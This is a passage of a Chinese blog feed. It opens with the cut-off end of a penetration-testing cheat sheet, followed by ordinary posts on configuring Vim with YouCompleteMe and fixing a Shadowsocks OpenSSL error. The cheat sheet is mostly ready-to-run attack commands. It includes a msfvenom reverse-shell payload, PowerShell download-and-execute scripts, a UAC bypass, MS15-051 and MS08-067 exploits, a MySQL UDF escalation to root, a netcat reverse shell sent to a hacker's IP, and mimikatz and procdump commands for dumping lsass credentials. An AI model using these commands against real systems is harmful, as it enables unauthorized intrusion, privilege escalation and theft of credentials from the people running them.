class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div></pre></div><div class="code"><pre><div class="line">msfvenom –p windows/shell_reverse_tcp LHOST=192.168.56.102 –f exe &gt; danger.exe</div><div class="line"></div><div class="line"># 显示账户配置</div><div class="line">net user &lt;login&gt;</div><div class="line"></div><div class="line"># Kali 上下载 psexec</div><div class="line"></div><div class="line">https://technet.microsoft.com/en-us/sysinternals/bb897553.aspx</div><div class="line"></div><div class="line"># 使用 powershell 脚本上传 psexec.exe 到目标机器</div><div class="line">echo $client = New-Object System.Net.WebClient &gt; script.ps1</div><div class="line">echo $targetlocation = &quot;http://192.168.56.102/PsExec.exe&quot; &gt;&gt; script.ps1</div><div class="line">echo $client.DownloadFile($targetlocation,&quot;psexec.exe&quot;) &gt;&gt; script.ps1</div><div class="line">powershell.exe -ExecutionPolicy Bypass -NonInteractive -File script.ps1</div><div class="line"></div><div class="line"># 使用 powershell 脚本上传 danger.exe 到目标机器</div><div class="line">echo $client = New-Object System.Net.WebClient &gt; script2.ps1</div><div class="line">echo $targetlocation = &quot;http://192.168.56.102/danger.exe&quot; &gt;&gt; script2.ps1</div><div class="line">echo $client.DownloadFile($targetlocation,&quot;danger.exe&quot;) &gt;&gt; script2.ps1</div><div class="line">powershell.exe -ExecutionPolicy Bypass -NonInteractive -File script2.ps1</div><div class="line"></div><div class="line"># 使用预编译的二进制文件绕过 UAC:</div><div class="line"></div><div class="line">https://github.com/hfiref0x/UACME</div><div class="line"></div><div class="line"># 使用 powershell 脚本上传 https://github.com/hfiref0x/UACME/blob/master/Compiled/Akagi64.exe 到目标机器</div><div class="line">echo $client = New-Object System.Net.WebClient &gt; script2.ps1</div><div class="line">echo $targetlocation = &quot;http://192.168.56.102/Akagi64.exe&quot; &gt;&gt; script3.ps1</div><div class="line">echo $client.DownloadFile($targetlocation,&quot;Akagi64.exe&quot;) &gt;&gt; script3.ps1</div><div class="line">powershell.exe -ExecutionPolicy Bypass -NonInteractive -File script3.ps1</div><div class="line"></div><div class="line"># 在 Kali 上创建监听</div><div class="line">nc -lvp 4444</div><div class="line"></div><div class="line"># 以系统权限使用 Akagi64 运行 danger.exe </div><div class="line">Akagi64.exe 1 C:\Users\User\Desktop\danger.exe</div><div class="line"></div><div class="line"># 在 Kali 上创建监听</div><div class="line">nc -lvp 4444</div><div class="line"></div><div class="line"># 下一步就会反弹给我们一个提过权的 shell</div><div class="line"># 以系统权限使用 PsExec 运行 danger.exe </div><div class="line">psexec.exe –i –d –accepteula –s danger.exe</div></pre></div></div></figure><h2 id="以普通用户身份在-Win7-上反弹具有系统权限的-Shell"><a href="#以普通用户身份在-Win7-上反弹具有系统权限的-Shell" class="headerlink" title="以普通用户身份在 Win7 上反弹具有系统权限的 Shell"></a>以普通用户身份在 Win7 上反弹具有系统权限的 Shell</h2><figure class="highlight plain"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div></pre></div><div class="code"><pre><div class="line">https://technet.microsoft.com/en-us/security/bulletin/dn602597.aspx #ms15-051</div><div class="line"></div><div class="line">https://www.fireeye.com/blog/threat-research/2015/04/probable_apt28_useo.html</div><div class="line"></div><div class="line"></div><div class="line">https://www.exploit-db.com/exploits/37049/</div><div class="line"></div><div class="line"># 查找目标机器是否安装了补丁，输入如下命令</div><div class="line">wmic qfe get</div><div class="line">wmic qfe | find &quot;3057191&quot;</div><div class="line"></div><div class="line"># 上传编译后的利用程序并运行它</div><div class="line"></div><div class="line">https://github.com/hfiref0x/CVE-2015-1701/raw/master/Compiled/Taihou64.exe</div><div class="line"></div><div class="line"># 默认情况下其会以系统权限执行 cmd.exe，但我们需要改变源代码以运行我们上传的 danger.exe</div><div class="line"># https://github.com/hfiref0x/CVE-2015-1701 下载它并定位到 &quot;main.c&quot;</div><div class="line"></div><div class="line"># 使用 wce.exe 获取已登录用户的明文账号密码</div><div class="line"></div><div class="line">http://www.ampliasecurity.com/research/windows-credentials-editor/</div><div class="line"></div><div class="line">wce -w</div><div class="line"></div><div class="line"># 使用 pwdump7 获取其他用户的密码哈希值</div><div class="line"></div><div class="line">http://www.heise.de/download/pwdump.html</div><div class="line"></div><div class="line"># we can try online hash cracking tools such crackstation.net</div><div class="line">MS08-067 – 不使用 Metasploit</div><div class="line"></div><div class="line">$ nmap -v -p 139, 445 --script=smb-check-vulns --script-args=unsafe=1 192.168.31.205</div><div class="line">$ searchsploit ms08-067</div><div class="line">$ python /usr/share/exploitdb/platforms/windows/remote/7132.py 192.168.31.205 1</div></pre></div></div></figure><h2 id="通过-MySQL-Root-账户实现提权"><a href="#通过-MySQL-Root-账户实现提权" class="headerlink" title="通过 MySQL Root 账户实现提权"></a>通过 MySQL Root 账户实现提权</h2><figure class="highlight plain"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></div><div class="code"><pre><div class="line"># Mysql Server version: 5.5.44-0ubuntu0.14.04.1 (Ubuntu)</div><div class="line">$ wget 0xdeadbeef.info/exploits/raptor_udf2.c</div><div class="line">$ gcc -g -c raptor_udf2.c</div><div class="line">$ gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc</div><div class="line">mysql -u root -p</div><div class="line">mysql&gt; use mysql;</div><div class="line">mysql&gt; create table foo(line blob);</div><div class="line">mysql&gt; insert into foo values(load_file(&apos;/home/user/raptor_udf2.so&apos;));</div><div class="line">mysql&gt; select * from foo into dumpfile &apos;/usr/lib/mysql/plugin/raptor_udf2.so&apos;;</div><div class="line">mysql&gt; create function do_system returns integer soname &apos;raptor_udf2.so&apos;;</div><div class="line">mysql&gt; select * from mysql.func;</div><div class="line">mysql&gt; select do_system(&apos;echo &quot;root:passwd&quot; | chpasswd &gt; /tmp/out; chown user:user /tmp/out&apos;);</div><div class="line"></div><div class="line">user:~$ su -</div><div class="line">Password:</div><div class="line">user:~# whoami</div><div class="line">root</div><div class="line">root:~# id</div><div class="line">uid=0(root) gid=0(root) groups=0(root)</div></pre></div></div></figure><h2 id="使用-LD-PRELOAD-注入程序"><a href="#使用-LD-PRELOAD-注入程序" class="headerlink" title="使用 LD_PRELOAD 注入程序"></a>使用 LD_PRELOAD 注入程序</h2><figure class="highlight plain"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></div><div class="code"><pre><div class="line">$ wget https://github.com/jivoi/pentest/ldpreload_shell.c</div><div class="line">$ gcc -shared -fPIC ldpreload_shell.c -o ldpreload_shell.so</div><div class="line">$ sudo -u user LD_PRELOAD=/tmp/ldpreload_shell.so /usr/local/bin/somesoft</div></pre></div></div></figure><h2 id="针对-OpenSSH-用户进行枚举时序攻击"><a href="#针对-OpenSSH-用户进行枚举时序攻击" class="headerlink" title="针对 OpenSSH 用户进行枚举时序攻击"></a>针对 OpenSSH 用户进行枚举时序攻击</h2><blockquote><p>枚举时序攻击(“Enumeration Timing Attack”)属于侧信道攻击/旁路攻击(Side Channel Attack)，侧信道攻击是指利用信道外的信息，比如加解密的速度/加解密时芯片引脚的电压/密文传输的流量和途径等进行攻击的方式，一个词形容就是“旁敲侧击”。–参考自 shotgun 在知乎上的解释。<br>osueta 是一个用于对 OpenSSH 进行时序攻击的 python2 脚本，其可以利用时序攻击枚举 OpenSSH 用户名，并在一定条件下可以对 OpenSSH 服务器进行 DOS 攻击。</p></blockquote><figure class="highlight plain"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></div><div class="code"><pre><div class="line"># https://github.com/c0r3dump3d/osueta</div><div class="line">$ ./osueta.py -H 192.168.1.6 -p 22 -U root -d 30 -v yes</div><div class="line">$ ./osueta.py -H 192.168.10.22 -p 22 -d 15 -v yes –dos no -L userfile.txt</div></pre></div></div></figure><h2 id="使用-ReDuh-构造合法的-HTTP-请求以建立-TCP-通道"><a href="#使用-ReDuh-构造合法的-HTTP-请求以建立-TCP-通道" class="headerlink" title="使用 ReDuh 构造合法的 HTTP 请求以建立 TCP 通道"></a>使用 ReDuh 构造合法的 HTTP 请求以建立 TCP 通道</h2><blockquote><p>ReDuh 是一个通过 HTTP 协议建立隧道传输各种其他数据的工具。其可以把内网服务器的端口通过 http/https 隧道转发到本机，形成一个连通回路。用于目标服务器在内网或做了端口策略的情况下连接目标服务器内部开放端口。</p></blockquote><figure class="highlight plain"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div></pre></div><div class="code"><pre><div class="line"># https://github.com/sensepost/reDuh</div><div class="line"></div><div class="line"># 步骤 1</div><div class="line"># 上传 reDuh.jsp 目标服务器</div><div class="line">$ http://192.168.10.50/uploads/reDuh.jsp</div><div class="line"></div><div class="line"># 步骤 2</div><div class="line"># 在本机运行 reDuhClient </div><div class="line">$ java -jar reDuhClient.jar http://192.168.10.50/uploads/reDuh.jsp</div><div class="line"></div><div class="line"># 步骤 3</div><div class="line"># 使用 nc 连接管理端口</div><div class="line">$ nc -nvv 127.0.0.1 1010</div><div class="line"></div><div class="line"># 步骤 4</div><div class="line"># 使用隧道转发本地端口到远程目标端口</div><div class="line">[createTunnel] 7777:172.16.0.4:3389</div><div class="line"></div><div class="line"># 步骤 5</div><div class="line"># 使用 RDP 连接远程</div><div class="line">$ /usr/bin/rdesktop -g 1024x768 -P -z -x l -k en-us -r sound:off localhost:7777</div></pre></div></div></figure><h2 id="Linux-常用安全命令"><a href="#Linux-常用安全命令" class="headerlink" title="Linux 常用安全命令"></a>Linux 常用安全命令</h2><figure class="highlight plain"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div></pre></div><div class="code"><pre><div class="line"># 使用 uid 查找对应的程序</div><div class="line">find / -uid 0 -perm -4000</div><div class="line"></div><div class="line"># 查找哪里拥有写权限</div><div class="line">find / -perm -o=w</div><div class="line"></div><div class="line"># 查找名称中包含点和空格的文件</div><div class="line">find / -name &quot; &quot; -print</div><div class="line">find / -name &quot;..&quot; -print</div><div class="line">find / -name &quot;. &quot; -print</div><div class="line">find / -name &quot; &quot; -print</div><div class="line"></div><div class="line"># 查找不属于任何人的文件</div><div class="line">find / -nouser</div><div class="line"></div><div class="line"># 查找未链接的文件</div><div class="line">lsof +L1</div><div class="line"></div><div class="line"># 获取进程打开端口的信息</div><div class="line">lsof -i</div><div class="line"></div><div class="line"># 看看 ARP 表中是否有奇怪的东西</div><div class="line">arp -a</div><div class="line"></div><div class="line"># 查看所有账户</div><div class="line">getent passwd</div><div class="line"></div><div class="line"># 查看所有用户组</div><div class="line">getent group</div><div class="line"></div><div class="line"># 列举所有用户的 crontabs</div><div class="line">for user in $(getent passwd|cut -f1 -d:); do echo &quot;### Crontabs for $user ####&quot;; crontab -u $user -l; done</div><div class="line"></div><div class="line"># 生成随机密码</div><div class="line">cat /dev/urandom| tr -dc ‘a-zA-Z0-9-_!@#$%^&amp;*()_+&#123;&#125;|:&lt;&gt;?=’|fold -w 12| head -n 4</div><div class="line"></div><div class="line"># 查找所有不可修改的文件</div><div class="line">find . | xargs -I file lsattr -a file 2&gt;/dev/null | grep ‘^….i’</div><div class="line"></div><div class="line"># 使文件不可修改</div><div class="line">chattr -i file</div></pre></div></div></figure><h2 id="实用的-Windows-cmd-命令"><a href="#实用的-Windows-cmd-命令" class="headerlink" title="实用的 Windows cmd 命令"></a>实用的 Windows cmd 命令</h2><figure class="highlight plain"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></div><div class="code"><pre><div class="line"></div><div class="line">net localgroup Users</div><div class="line">net localgroup Administrators</div><div class="line">search dir/s *.doc</div><div class="line">system(&quot;start cmd.exe /k $cmd&quot;)</div><div class="line">sc create microsoft_update binpath=&quot;cmd /K start c:\nc.exe -d ip-of-hacker port -e cmd.exe&quot; start= auto error= ignore</div><div class="line">/c C:\nc.exe -e c:\windows\system32\cmd.exe -vv 23.92.17.103 7779</div><div class="line">mimikatz.exe &quot;privilege::debug&quot; &quot;log&quot; &quot;sekurlsa::logonpasswords&quot;</div><div class="line">Procdump.exe -accepteula -ma lsass.exe lsass.dmp</div><div class="line">mimikatz.exe &quot;sekurlsa::minidump lsass.dmp&quot; &quot;log&quot; &quot;sekurlsa::logonpasswords&quot;</div><div class="line">C:\temp\procdump.exe -accepteula -ma lsass.exe lsass.dmp 32 位系统</div><div class="line">C:\temp\procdump.exe -accepteula -64 -ma lsass.exe lsass.dmp 64 位系统</div></pre></div></div></figure>]]></content>
      
      <categories>
          
          <category> Sec </category>
          
          <category> Kali </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Hacker </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>自定义VIM插件为IDE利器</title>
      <link href="/2016/12/21/vim-plugin/"/>
      <url>/2016/12/21/vim-plugin/</url>
      <content type="html"><![CDATA[<p><img src="https://kionf.com/article_images/vim-plugins.gif" alt="kionf"></p><blockquote><p>如图是VIM自定义插件及配置后的演示，虽然有Pycharm但是算不上轻量级，写个运维小脚本根本用不到，一般笔者只有在写Django或读python项目源码的时候会用，so我们开始吧</p></blockquote><a id="more"></a><h2 id="1-安装插件管理工具Vundle"><a href="#1-安装插件管理工具Vundle" class="headerlink" title="1. 安装插件管理工具Vundle"></a>1. 安装插件管理工具<a href="https://github.com/VundleVim/Vundle.Vim" title="Vundle是Vim插件管理工具" target="_blank" rel="noopener">Vundle</a></h2><figure class="highlight bash"><div class="figcode"><div class="gutter"><pre><div class="line">1</div></pre></div><div class="code"><pre><div class="line">git <span class="built_in">clone</span> https://github.com/gmarik/vundle.git ~/.vim/bundle/vundle</div></pre></div></div></figure><p>编辑文件~/.vimrc</p><figure class="highlight plain"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></div><div class="code"><pre><div class="line">set nocompatible                    &quot; be iMproved</div><div class="line"></div><div class="line">filetype off                        &quot; required!</div><div class="line">set rtp+=~/.vim/bundle/vundle/</div><div class="line">call vundle#rc()</div><div class="line"></div><div class="line">&quot;my Bundle here:</div><div class="line">Bundle &apos;Valloric/YouCompleteMe&apos;&quot;代码补全</div><div class="line">Plugin &apos;Yggdroot/indentLine&apos;&quot;垂直对齐线</div><div class="line">Plugin &apos;Chiel92/vim-autoformat&apos;&quot;自动语法缩进</div><div class="line"></div><div class="line">filetype plugin indent on</div><div class="line"></div><div class="line"></div><div class="line">&quot; hot key</div></pre></div></div></figure><p>修改完成后命令行执行 <code>vim +PluginInstall +qall</code> 等待安装完成，执行<code>vim +BundleInstall +qall</code> 下载<strong>Valloric/YouCompleteMe</strong>包（可能久些）</p><h2 id="2-编译安装YouCompleteMe"><a href="#2-编译安装YouCompleteMe" class="headerlink" title="2. 编译安装YouCompleteMe"></a>2. 编译安装<a href="https://github.com/Valloric/YouCompleteMe#ubuntu-linux-x64" title="代码补全神器" target="_blank" rel="noopener">YouCompleteMe</a></h2><p>安装编译所需软件：</p><figure class="highlight bash"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></div><div class="code"><pre><div class="line">sudo apt-get install build-essential cmake</div><div class="line">sudo apt-get install python-dev python3-dev</div></pre></div></div></figure><h3 id="可选编译支持代码补全"><a href="#可选编译支持代码补全" class="headerlink" title="可选编译支持代码补全"></a>可选编译支持代码补全</h3><p><strong>1. 编译具有对C系列语言支持的YCM：</strong></p><figure class="highlight bash"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></div><div class="code"><pre><div class="line"><span class="built_in">cd</span> ~/.vim/bundle/YouCompleteMe</div><div class="line">./install.py --clang-completer</div></pre></div></div></figure><p><strong>2. 编译YCM没有C语言的支持：</strong></p><figure class="highlight plain"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></div><div class="code"><pre><div class="line">cd ~/.vim/bundle/YouCompleteMe</div><div class="line">./install.py</div></pre></div></div></figure><p><strong>3. 编译所有支持的语言：</strong></p><figure class="highlight plain"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></div><div class="code"><pre><div class="line">cd ~/.vim/bundle/YouCompleteMe</div><div class="line">./install.py --all</div></pre></div></div></figure><blockquote><p>脚本会自动下载所需包，笔者选择的是编译所有支持语言全部下来大小在400MB左右</p></blockquote><h2 id="3-报错解决"><a href="#3-报错解决" class="headerlink" title="3. 报错解决"></a>3. 报错解决</h2><p>报错如下：</p><figure class="highlight bash"><div class="figcode"><div class="gutter"><pre><div class="line">1</div></pre></div><div class="code"><pre><div class="line">YouCompleteMe unavailable: requires Vim compiled with  Python 2.x support</div></pre></div></div></figure><p>原因：</p><p>执行<code>vim --version|grep python</code></p><figure class="highlight plain"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></div><div class="code"><pre><div class="line">-python</div><div class="line">-python3</div></pre></div></div></figure><p>vim编译安装的时候默认没有支持Python</p><p>解决：</p><p>在Debian中<code>sudo apt-get install vim-nox</code></p><p>在Ubuntu中<code>sudo apt-get install vim-gnome-py2</code></p><p>其他Linux发行版中如果没有上述软件包，需要重新下载vim源码重新编译，加选项<code>--enable-python3interp=yes</code></p><p>更多解决方案：<a href="http://stackoverflow.com/questions/20160902/how-to-solve-requires-python-2-x-support-in-linux-vim-and-it-have-python-2-6-6" target="_blank" rel="noopener">stackoverflow</a></p><blockquote><p>只有个别发行版中Vim会不编译支持Python</p></blockquote><h2 id="附加：-python交互模式中代码自动补全，及笔者-vimrc配置文件"><a href="#附加：-python交互模式中代码自动补全，及笔者-vimrc配置文件" class="headerlink" title="附加： python交互模式中代码自动补全，及笔者.vimrc配置文件"></a>附加： python交互模式中代码自动补全，及笔者<code>.vimrc</code>配置文件</h2><p>家目录写入<code>.pythontab</code>文件</p><p><code>vim ~/.pythontab</code></p><figure class="highlight python"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></div><div class="code"><pre><div class="line"><span class="comment"># python startup file</span></div><div class="line"><span class="comment"># -*- coding: utf8 -*-</span></div><div class="line"><span class="keyword">import</span> sys</div><div class="line"><span class="keyword">import</span> readline</div><div class="line"><span class="keyword">import</span> rlcompleter</div><div class="line"><span class="keyword">import</span> atexit</div><div class="line"><span class="keyword">import</span> os</div><div class="line"><span class="comment"># tab completion</span></div><div class="line">readline.parse_and_bind(<span class="string">'tab: complete'</span>)<span class="comment">#tab键可自定义</span></div><div class="line"><span class="comment"># history file</span></div><div class="line">histfile = os.path.join(os.environ[<span class="string">'HOME'</span>], <span class="string">'.pythonhistory'</span>)</div><div class="line"><span class="keyword">try</span>:</div><div class="line">    readline.read_history_file(histfile)</div><div class="line"><span class="keyword">except</span> IOError:</div><div class="line">    <span class="keyword">pass</span></div><div class="line">atexit.register(readline.write_history_file, histfile)</div><div class="line"></div><div class="line"></div><div class="line"><span class="keyword">del</span> os, histfile, readline, rlcompleter</div></pre></div></div></figure><p><code>chmod +x .pythontab</code></p><p>编辑<code>~/.bashrc</code>文件加入环境变量</p><figure class="highlight bash"><div class="figcode"><div class="gutter"><pre><div class="line">1</div></pre></div><div class="code"><pre><div class="line"><span class="built_in">echo</span> <span class="string">"export PYTHONSTARTUP=~/.pythontab"</span> &gt;&gt; ~/.bashrc &amp;&amp; <span class="built_in">source</span> ~/.bashrc</div></pre></div></div></figure><p><strong>测试：</strong></p><blockquote><p>双击tab键补全,可更改在<code>~/.pythontab</code>文件中有做注释</p></blockquote><figure class="highlight bash"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></div><div class="code"><pre><div class="line">kionf@kionf-pc[18:23]~:$ python</div><div class="line">Python 2.7.12+ (default, Aug  4 2016, 20:04:34) </div><div class="line">[GCC 6.1.1 20160724] on linux2</div><div class="line">Type <span class="string">"help"</span>, <span class="string">"copyright"</span>, <span class="string">"credits"</span> or <span class="string">"license"</span> <span class="keyword">for</span> more information.</div><div class="line">&gt;&gt;&gt; import random</div><div class="line">&gt;&gt;&gt; random.</div><div class="line">random.BPF                  random.__reduce__(          random.betavariate(</div><div class="line">random.LOG4                 random.__reduce_ex__(       random.choice(</div><div class="line">random.NV_MAGICCONST        random.__repr__(            random.division</div><div class="line">..........................................................................</div><div class="line">random.__package__          random._warn(               </div><div class="line">&gt;&gt;&gt; random.</div></pre></div></div></figure><p><strong>.vimrc配置文件</strong></p><figure class="highlight sh"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div></pre></div><div class="code"><pre><div class="line"><span class="built_in">set</span> nocompatible                <span class="string">" be iMproved</span></div><div class="line"><span class="string"></span></div><div class="line"><span class="string">set tabstop=4"</span>tab键为4个空格</div><div class="line"><span class="built_in">set</span> shiftwidth=4</div><div class="line"><span class="built_in">set</span> expandtab</div><div class="line"><span class="built_in">set</span> nu  <span class="string">"显示行号，复制的时候可以:set nu!来取消显示</span></div><div class="line"><span class="string">syntax on</span></div><div class="line"><span class="string"></span></div><div class="line"><span class="string"></span></div><div class="line"><span class="string">filetype off                    "</span> required!</div><div class="line"><span class="built_in">set</span> rtp+=~/.vim/bundle/vundle/</div><div class="line">call vundle<span class="comment">#rc()</span></div><div class="line"></div><div class="line"><span class="string">"my Bundle here:</span></div><div class="line"><span class="string">Bundle 'Valloric/YouCompleteMe'</span></div><div class="line"><span class="string">Plugin 'Yggdroot/indentLine'</span></div><div class="line"><span class="string">Plugin 'Chiel92/vim-autoformat'</span></div><div class="line"><span class="string"></span></div><div class="line"><span class="string"></span></div><div class="line"><span class="string">filetype plugin indent on</span></div><div class="line"><span class="string"></span></div><div class="line"><span class="string"></span></div><div class="line"><span class="string">"</span> hot key</div><div class="line">noremap &lt;F3&gt; :Autoformat&lt;CR&gt;    <span class="string">"自动缩进</span></div><div class="line"><span class="string">nnoremap &lt;silent&gt; &lt;F2&gt; :!clear;python %&lt;CR&gt;  "</span>调试python文件vim下F2运行当前文件</div></pre></div></div></figure>]]></content>
      
      <categories>
          
          <category> Vim </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>ShadowSocks启动报错undefined symbol EVP_CIPHER_CTX_cleanup</title>
      <link href="/2016/12/15/errornote-ss/"/>
      <url>/2016/12/15/errornote-ss/</url>
      <content type="html"><![CDATA[<blockquote class="blockquote-center"><p>解决openssl升级到1.1.0以上版本，导致shadowsocks2.8.2启动报undefined symbol: EVP_CIPHER_CTX_cleanup错误。</p></blockquote><a id="more"></a><h2 id="准备翻墙冲浪的时候Shadowsocks报错如下："><a href="#准备翻墙冲浪的时候Shadowsocks报错如下：" class="headerlink" title="准备翻墙冲浪的时候Shadowsocks报错如下："></a>准备翻墙冲浪的时候Shadowsocks报错如下：</h2><figure class="highlight sh"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></div><div class="code"><pre><div class="line">AttributeError: /usr/<span class="built_in">local</span>/ssl/lib/libcrypto.so.1.1: undefined symbol: EVP_CIPHER_CTX_cleanup</div><div class="line">shadowsocks start failed</div></pre></div></div></figure><h2 id="解决方法-："><a href="#解决方法-：" class="headerlink" title="解决方法 ："></a>解决方法 ：</h2><h3 id="1-vim打开文件openssl-py"><a href="#1-vim打开文件openssl-py" class="headerlink" title="1. vim打开文件openssl.py"></a>1. vim打开文件openssl.py</h3><p><code>vim /usr/local/lib/python3.5/dist-packages/shadowsocks/crypto/openssl.py</code></p><blockquote><p>路径不同根据报错路径而定</p></blockquote><h3 id="2-修改libcrypto-EVP-CIPHER-CTX-cleanup-argtypes"><a href="#2-修改libcrypto-EVP-CIPHER-CTX-cleanup-argtypes" class="headerlink" title="2. 修改libcrypto.EVP_CIPHER_CTX_cleanup.argtypes"></a>2. 修改libcrypto.EVP_CIPHER_CTX_cleanup.argtypes</h3><p><code>:%s/cleanup/reset/</code></p><p><code>:x</code></p><blockquote><p>以上两条为VIM命令， 替换文中<strong>libcrypto.EVP_CIPHER_CTX_cleanup.argtypes</strong> 为<strong>libcrypto.EVP_CIPHER_CTX_reset.argtypes </strong>共两处，并保存</p></blockquote><h3 id="3-运行Shadowsocks"><a href="#3-运行Shadowsocks" class="headerlink" title="3. 运行Shadowsocks"></a>3. 运行Shadowsocks</h3><p>OK</p><h2 id="原因："><a href="#原因：" class="headerlink" title="原因："></a>原因：</h2><p>这个问题是由于在openssl1.1.0版本中，废弃了EVP_CIPHER_CTX_cleanup函数，如官网中所说：</p><blockquote><p>EVP_CIPHER_CTX was made opaque in OpenSSL 1.1.0. As a result, EVP_CIPHER_CTX_reset() appeared and EVP_CIPHER_CTX_cleanup() disappeared. EVP_CIPHER_CTX_init() remains as an alias for EVP_CIPHER_CTX_reset().</p><p><strong>EVP_CIPHER_CTX_reset函数替代了EVP_CIPHER_CTX_cleanup函数</strong></p></blockquote><p>EVP_CIPHER_CTX_reset函数说明：</p><blockquote><p>EVP_CIPHER_CTX_reset() clears all information from a cipher context and free up any allocated memory associate with it, except the ctx itself. This function should be called anytime ctx is to be reused for another EVP_CipherInit() / EVP_CipherUpdate() / EVP_CipherFinal() series of calls.</p></blockquote><p>EVP_CIPHER_CTX_cleanup函数说明：</p><blockquote><p>EVP_CIPHER_CTX_cleanup() clears all information from a cipher context and free up any allocated memory associate with it. It should be called after all operations using a cipher are complete so sensitive information does not remain in memory.</p></blockquote><p><strong>可以看出，二者功能基本上相同，都是释放内存，只是应该调用的时机稍有不同，所以用reset代替cleanup问题不大。</strong></p><h2 id="提示："><a href="#提示：" class="headerlink" 